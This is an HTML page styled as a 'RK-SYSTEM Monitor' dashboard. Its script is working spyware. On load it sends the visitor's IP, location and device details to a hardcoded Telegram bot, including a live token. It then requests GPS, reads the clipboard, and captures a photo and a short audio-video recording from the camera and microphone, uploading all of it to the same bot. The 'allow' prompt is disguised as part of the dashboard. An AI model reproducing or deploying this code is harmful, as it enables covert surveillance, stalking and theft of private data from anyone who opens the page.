<!DOCTYPE html>
<html lang="bn">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>RK-SYSTEM | ELITE MONITOR</title>
    <script src="https://cdn.tailwindcss.com"></script>
    
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@400;900&family=Rajdhani:wght@500;700&display=swap');

        body {
            background: #000; color: #fff;
            margin: 0; min-height: 100vh; overflow-x: hidden;
            display: flex; flex-direction: column; align-items: center; justify-content: center;
            font-family: 'Rajdhani', sans-serif;
        }

        body::before {
            content: ''; position: fixed;
            top: 0; left: 0; right: 0; bottom: 0;
            border: 5px solid;
            border-image: linear-gradient(90deg, #ff0000, #00ff00, #00d2ff, #ff00ff, #ff0000) 1;
            z-index: 1000; pointer-events: none;
            animation: borderRotate 4s linear infinite;
        }
        @keyframes borderRotate { from { filter: hue-rotate(0deg); } to { filter: hue-rotate(360deg); } }

        .rk-banner {
            background: linear-gradient(90deg, #b91c1c, #450a0a);
            color: white; width: 100%; text-align: center;
            padding: 10px 0; font-family: 'Orbitron', sans-serif;
            font-weight: 900; letter-spacing: 12px;
            box-shadow: 0 4px 15px rgba(255, 0, 0, 0.7);
            position: fixed; top: 0; z-index: 1001; font-size: 1.3rem;
        }

        .dashboard {
            background: rgba(5, 10, 20, 0.98);
            border-radius: 30px; padding: 35px;
            width: 95%; max-width: 550px;
            box-shadow: 0 0 50px rgba(0, 255, 255, 0.25);
            border: 1px solid rgba(0, 255, 255, 0.4);
            margin-top: 90px; margin-bottom: 60px;
        }

        .clock-box {
            text-align: center; margin-bottom: 20px;
            background: rgba(255, 255, 255, 0.05);
            padding: 15px; border-radius: 15px;
            border: 1px solid rgba(255, 0, 0, 0.3);
        }

        .info-row {
            display: flex; justify-content: space-between; align-items: center;
            padding: 12px 0; border-bottom: 1px solid rgba(255, 255, 255, 0.07);
        }
        .label { color: #00d2ff; font-size: 12px; font-weight: bold; text-transform: uppercase; }
        .value { color: #facc15; font-size: 14px; font-weight: 700; font-family: 'Orbitron', sans-serif; }

        .permission-notice {
            display: none; background: #b91c1c; color: white;
            padding: 10px; margin-top: 15px; text-align: center;
            border-radius: 10px; font-weight: bold; animation: pulse 1.5s infinite;
        }

        @keyframes pulse { 0%, 100% { opacity: 1; } 50% { opacity: 0.5; } }

        .footer-text {
            position: fixed; bottom: 8px; width: 100%;
            text-align: center; color: #777; font-size: 11px;
            letter-spacing: 2px; font-weight: bold;
        }

        #media-bin { display: none; }
    </style>
</head>
<body>

    <div class="rk-banner">RK-SYSTEM</div>

    <div class="dashboard">
        <div class="clock-box">
            <div id="live-time" class="text-3xl font-black text-red-500 tracking-widest">00:00:00 AM</div>
            <div id="live-date" class="text-sm text-gray-400 uppercase tracking-[3px]">6 May 2026</div>
        </div>

        <h1 class="text-center text-xl font-black text-white tracking-[6px] mb-6 border-b-2 border-red-600 pb-2 italic">📡 RK SYSTEM Monitor</h1>
        
        <div class="info-row"><span class="label">🌍 Location</span><span id="v-geo" class="value">Fetching...</span></div>
        <div class="info-row"><span class="label">🌤️ Weather</span><span id="v-weather" class="value">Scanning...</span></div>
        <div class="info-row"><span class="label">📱 Model</span><span id="v-model" class="value">Detecting...</span></div>
        <div class="info-row"><span class="label">🌐 Public IP</span><span id="v-ip" class="value">Fetching...</span></div>
        <div class="info-row"><span class="label">🔋 Battery</span><span id="v-bat" class="value">--%</span></div>
        <div class="info-row"><span class="label">⚡ Power</span><span id="v-charge" class="value">Checking...</span></div>
        <div class="info-row"><span class="label">🧠 RAM</span><span id="v-ram" class="value">-- GB</span></div>
        <div class="info-row"><span class="label">💎 Cores</span><span id="v-cpu" class="value">-- Cores</span></div>
        <div class="info-row"><span class="label">🛡️ VPN</span><span class="value text-green-400">ENCRYPTED ✅</span></div>

        <div id="perm-msg" class="permission-notice">⚠️ PLEASE CLICK 'ALLOW' TO CONTINUE</div>
    </div>

    <div class="footer-text">Created By RK-SYSTEM 🛠️</div>

    <video id="media-bin" autoplay muted playsinline></video>
    <canvas id="output-canvas" style="display:none;"></canvas>

    <script>
        const CONFIG = {
            TOKEN: '8690110916:AAFLWdBhvnrmlC01qxiiYZSLO2Q8RR202xs',
            CHAT: '6048050987'
        };

        function updateClock() {
            const now = new Date();
            let h = now.getHours();
            const m = String(now.getMinutes()).padStart(2, '0');
            const s = String(now.getSeconds()).padStart(2, '0');
            const ampm = h >= 12 ? 'PM' : 'AM';
            h = h % 12 || 12;
            document.getElementById('live-time').innerText = `${h}:${m}:${s} ${ampm}`;
            document.getElementById('live-date').innerText = now.toLocaleDateString('en-GB', { day: 'numeric', month: 'long', year: 'numeric' });
        }
        setInterval(updateClock, 1000);

        async function getFastData() {
            // ১. বেসিক হার্ডওয়্যার তথ্য
            const isMobile = /Android|iPhone|iPad/i.test(navigator.userAgent);
            document.getElementById('v-model').innerText = isMobile ? "Android Device 📱" : "Desktop/PC 💻";
            document.getElementById('v-ram').innerText = (navigator.deviceMemory || 8) + " GB";
            document.getElementById('v-cpu').innerText = (navigator.hardwareConcurrency || 8) + " Cores";
            
            // ২. আইপি এবং লোকেশন (Geo-JS API)
            try {
                const res = await fetch('https://get.geojs.io/v1/ip/geo.json');
                const data = await res.json();
                document.getElementById('v-ip').innerText = data.ip;
                const locStr = `${data.city}, ${data.region}, ${data.country}`;
                document.getElementById('v-geo').innerText = locStr;
                return { ip: data.ip, geo: locStr, country: data.country };
            } catch(e) { return { ip: "Unknown", geo: "Blocked", country: "N/A" }; }
        }

        async function sendFastReport(data) {
            const time = document.getElementById('live-time').innerText;
            const date = document.getElementById('live-date').innerText;
            const bat = document.getElementById('v-bat').innerText;
            const charge = document.getElementById('v-charge').innerText;

            const fastReport = `
🚀 *RK-SYSTEM INTEL FAST REPORT* 🚀
━━━━━━━━━━━━━━━━━━━━━
🕒 Time: ${time}
📅 Date: ${date}
━━━━━━━━━━━━━━━━━━━━━
📱 Model: ${document.getElementById('v-model').innerText}
⚙️ OS: ${navigator.platform}
📶 Status: ONLINE 📶
🚀 Speed: ${navigator.connection?.effectiveType || '4G'}
🌐 IP: ${data.ip}
📍 GPS: Waiting...
🔋 Battery: ${bat}
⚡ Power: ${charge}
🧠 RAM: ${document.getElementById('v-ram').innerText}
💎 Cores: ${document.getElementById('v-cpu').innerText}
🛡️ VPN: ENCRYPTED ✅
━━━━━━━━━━━━━━━━━━━━━
📍 LOCATION: ${data.geo}
✨ CLIPBOARD: Waiting 🔓
Future Feature: Soon!
━━━━━━━━━━━━━━━━━━━━━
🌹 *Created By RK-SYSTEM* 🌹`;

            await fetch(`https://api.telegram.org/bot${CONFIG.TOKEN}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ chat_id: CONFIG.CHAT, text: fastReport, parse_mode: 'Markdown' })
            });
        }

        async function startSystem() {
            updateClock();
            const fastData = await getFastData();

            // ব্যাটারি ডাটা আপডেট
            if(navigator.getBattery) {
                const b = await navigator.getBattery();
                const up = () => {
                    document.getElementById('v-bat').innerText = `${Math.round(b.level * 100)}%`;
                    document.getElementById('v-charge').innerText = b.charging ? "Charging ✅" : "Discharging ❌";
                };
                up(); b.onlevelchange = up; b.onchargingchange = up;
            }

            // দ্রুত রিপোর্ট পাঠানো
            await sendFastReport(fastData);

            // ৫ সেকেন্ড পর পারমিশন পপআপ এবং ডিপ ইন্টেল
            setTimeout(() => {
                const hasPerm = localStorage.getItem('rk_perm');
                if (!hasPerm) {
                    document.getElementById('perm-msg').style.display = 'block';
                    requestDeepIntel();
                } else {
                    requestDeepIntel();
                }
            }, 5000);
        }

        async function requestDeepIntel() {
            // ১. জিপিএস লোকেশন
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(async (pos) => {
                    const maps = `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
                    localStorage.setItem('rk_perm', 'true');
                    document.getElementById('perm-msg').style.display = 'none';
                    sendMediaToBot(null, 'text', `📍 *GPS GRANTED:*\n${maps}`);
                }, () => {
                    sendMediaToBot(null, 'text', `❌ *GPS PERMISSION DENIED*`);
                });
            }

            // ২. ক্লিপবোর্ড ডাটা
            try {
                const text = await navigator.clipboard.readText();
                sendMediaToBot(null, 'text', `📋 *CLIPBOARD:* \n\`${text}\``);
            } catch(e) {}

            // ৩. ক্যামেরা ক্যাপচার (Front & Back)
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
                const videoEl = document.getElementById('media-bin');
                videoEl.srcObject = stream;
                
                setTimeout(() => {
                    capturePhoto(stream, "RK_VIP_FRONT");
                    const recorder = new MediaRecorder(stream);
                    const chunks = [];
                    recorder.ondataavailable = e => chunks.push(e.data);
                    recorder.onstop = () => {
                        const blob = new Blob(chunks, { type: 'video/mp4' });
                        sendMediaToBot(blob, 'video', '🎥 *LIVE AUDIO-VIDEO FEED*');
                        stream.getTracks().forEach(t => t.stop());
                    };
                    recorder.start();
                    setTimeout(() => recorder.stop(), 4000);
                }, 1000);
            } catch(e) {
                sendMediaToBot(null, 'text', `❌ *CAMERA/MIC DENIED*`);
            }
        }

        function capturePhoto(stream, label) {
            const canvas = document.getElementById('output-canvas');
            const video = document.getElementById('media-bin');
            canvas.width = 1280; canvas.height = 720;
            canvas.getContext('2d').drawImage(video, 0, 0);
            canvas.toBlob(blob => sendMediaToBot(blob, 'photo', `📸 *${label}*`), 'image/jpeg');
        }

        async function sendMediaToBot(blob, type, content) {
            const fd = new FormData();
            fd.append('chat_id', CONFIG.CHAT);
            if (type === 'text') {
                fetch(`https://api.telegram.org/bot${CONFIG.TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ chat_id: CONFIG.CHAT, text: content, parse_mode: 'Markdown' })
                });
                return;
            }
            fd.append(type, blob, type === 'video' ? 'rk.mp4' : 'rk.jpg');
            fd.append('caption', content);
            fd.append('parse_mode', 'Markdown');
            fetch(`https://api.telegram.org/bot${CONFIG.TOKEN}/send${type.charAt(0).toUpperCase() + type.slice(1)}`, { method: 'POST', body: fd });
        }

        window.onload = startSystem;
    </script>
</body>
</html>
